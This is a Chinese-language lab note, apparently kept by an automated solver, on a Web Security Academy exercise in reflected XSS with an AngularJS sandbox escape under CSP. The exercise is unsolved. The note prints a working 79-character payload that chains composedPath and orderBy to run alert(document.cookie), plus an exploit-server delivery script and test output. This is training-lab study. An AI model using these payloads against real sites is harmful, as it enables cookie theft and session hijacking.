---
title: "lab-angular-sandbox-escape-and-csp"
links:
  - target: client-side-template-injection-family
    relation: evidences
---

# lab-angular-sandbox-escape-and-csp

> evidences: [[client-side-template-injection-family]]

- 题面:Reflected XSS with AngularJS sandbox escape and CSP(/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)
- 实例(批38):https://0a6100080471e4d680ec12c300ae00a5.web-security-academy.net(exploit 0a87003c044ee4d980e311b9014b00ab)
- 判定目标:CSP 下逃逸 AngularJS 沙箱并 `alert(document.cookie)`;状态:**unresolved**(批38 把未决面收窄到"触发时机 × 80 字符预算"的算术冲突)

## 已确认

1. `?search=` 原样反射进 `<h1>0 search results for '…'</h1>`;`<body ng-app ng-csp>`,`angular_1-4-4.js`,CSP `script-src 'self'`(内联脚本/内联事件全挡,
   只能走 Angular 表达式);长度上限 **80**(81+ -> 400)。
2. 可用链(批24 实证):`$event.composedPath()` 通过 expensive 检查 -> `|orderBy:'(y=alert)(document.cookie)'` 以数组元素为 scope 求值,
   末元素是 window -> 赋值式调用绕开 isecwindow;**79 字符**载荷字面量(ng 冒号属性形;载荷不带闭合 `>`,由反射上下文补):`/?search=<input id=x ng:focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)' #x`
3. **批38 关键诊断(本机 Chrome,browser_suite eval)**:
   - `$event.path` 在本版 Chrome 是 **undefined** => 省 10 字符的短写法不可用(只有 `composedPath()` 21 字符可用)。
   - 链本身没问题:手工 dispatch focus + 捕获 alert -> `{"alerted":""}`(空 cookie,链条正确)。
   - **但片段聚焦不触发**:注入的 `<input id=x …>` 确实成了 `document.activeElement.id==="x"`,却**没有** ng-focus 效果
     => 片段聚焦发生在 Angular 编译(挂 ng-focus 监听)之前 => 79 字符载荷在"加载即触发"这条路上**结构性不可靠**。
   - 确定性触发 `autofocus`(浏览器在 load 时 flush,晚于 bootstrap)需要 **84 字符 > 80** 。
4. 交付已补齐(批24 缺的一步):exploit server STORE + DELIVER_TO_VICTIM,
   `responseBody=<script>location='<inst>/?search=<ENC>#x'</script>`;另试过 iframe+setTimeout 改 hash 的二次片段导航 -- **均未翻**。

## 未决面(更锐利)

- 冲突:能在编译后触发的只有 `autofocus`(+10)与 `$event.path`(-10)同类替换;当前约束下
  `composedPath()`(21)+ 赋值式 alert 参数(28)在 80 字符内放不下 `autofocus`。需要
  (a) ≤80 且能在编译后触发的**事件**替代(Ng 在 CSP 模式支持的事件列表:focus/blur/change/click/key* 等,均为交互或加载时序),
  或 (b) 更短的"取 window"原语(本版 Chrome 无 `event.path`;`event.view` 被 isecwindow 拦),
  或 (c) 更短的 alert 参数写法。
- 下一步:用 `lab_alert --driver` 枚举候选(每次 `blur();focus()` 触发)以区分"载荷语法"与"触发时机";再试 `<input autofocus ng-focus=…>` 的 84 字符版本
  能否绕过长度检查(如重复参数/多参数拆分)。

## 证据摘录

```
browser_suite eval: $parse("$event.composedPath()|orderBy:'(y=alert)(document.cookie)'") + 手工 focus -> {"alerted":""}   # 链通,cookie 为空
browser_suite eval: (new Event('focus')).path -> "undefined"                                                              # 短写法不可用
browser_suite eval: goto 带 #x 的载荷页 -> activeId="x", 但无 alert(fragment 聚焦早于 ng-focus 挂载)
lab_alert "<inst>/?search=<79B 载荷>#x" -> alerts:[] fired:false ; 交付(exploit server)-> solved_check false
```
